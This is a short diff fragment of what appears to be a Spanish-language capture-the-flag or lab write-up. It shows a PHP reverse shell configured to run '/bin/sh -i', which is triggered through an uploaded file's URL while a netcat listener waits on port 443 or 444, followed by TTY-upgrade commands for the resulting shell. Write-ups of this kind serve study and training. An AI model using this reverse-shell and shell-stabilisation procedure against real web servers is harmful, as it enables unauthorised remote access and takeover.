@@ -96,3 +96,28 @@ $shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 ```
+
+Esta vez no necesitamos hacer tantos pasos:
+
+- En la URL: `http://elsitioweb/uploads/php-reverse-shell.php`
+- Teniendo en cuenta que el puerto esta en escucha (443 ó 444)
+- Ejecutamos...
+
+Hacemos tratamiento de TTY (interactive):
+
+```sh
+$ ls
+$ script /dev/null -c bash
+www-data@simple:/$ ^Z
+szh: suspended nc -nlvp 444
+
+(root@kali)-[/home/kali/Desktop]
+-> $ stty raw -echo; fg
+[1] + continued nc -nlvp 444
+...
+
+$ export SHELL=bash
+$ export TERM=xterm
+...
+```
+
